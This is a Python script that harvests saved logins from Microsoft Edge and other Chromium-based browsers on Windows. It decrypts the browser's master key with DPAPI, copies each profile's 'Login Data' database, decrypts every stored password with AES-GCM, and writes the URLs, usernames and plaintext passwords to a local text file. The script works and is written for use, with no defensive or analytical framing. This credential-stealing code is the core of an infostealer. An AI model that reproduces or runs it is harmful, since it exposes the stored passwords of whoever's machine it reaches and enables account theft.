import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
import shutil
from Cryptodome.Cipher import AES

def get_encrypted_key(home_folder):
    try:
        with open(os.path.normpath(home_folder + "\Local State"), "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"{str(e)}\n[E] Couldn't extract encrypted_key!")
        return None

def decrypt_password(ciphertext, encrypted_key):
    try:
        chrome_secret = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = AES.new(encrypted_key, AES.MODE_GCM, chrome_secret)
        return cipher.decrypt(encrypted_password).decode()
    except Exception as e:
        print(f"{str(e)}\n[E] Couldn't decrypt password. Is Chromium version older than 80?")
        return ""

def get_db(login_data_path):
    try:
        shutil.copy2(login_data_path, "login_data_copy.db")
        return sqlite3.connect("login_data_copy.db")
    except Exception as e:
        print(f"{str(e)}\n[E] Couldn't find the \"Login Data\" database!")
        return None

def get_edge_creds(user_data, browser_name):
    if (os.path.exists(user_data) and os.path.exists(user_data + r"\Local State")):
        print(f"[I] Found {os.environ['USERPROFILE']}'s {browser_name} folder - decrypting...")
        encrypted_key = get_encrypted_key(user_data)
        folders = [item for item in os.listdir(user_data) if re.search("^Profile*|^Default$",item)!=None]
        for folder in folders:
            # Get data from the Login Data file (SQLite database)
            login_data_path = os.path.normpath(fr"{user_data}\{folder}\Login Data")
            db = get_db(login_data_path)
            if(encrypted_key and db):
                cursor = db.cursor()
                cursor.execute("select action_url, username_value, password_value from logins")
                for index,login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if (url!="" and username!="" and ciphertext!=""):
                        decrypted_pass = decrypt_password(ciphertext, encrypted_key)
                        message = str(index)+" "+("="*50)
                        message+= f"\nURL: {url}"
                        message+= f"\nUsername: {username}"
                        message+= f"\nPassword: {decrypted_pass}\n"
                        with open("Edge_passwords.txt", "a+") as f:
                            for datas in message:
                                f.write(datas)
                        # print(str(index)+" "+("="*50)+f"\nURL: {url}\nUsername: {username}\nPassword: {decrypted_pass}\n")
            # Remove the temporary file
            cursor.close()
            db.close()
            os.remove("login_data_copy.db")
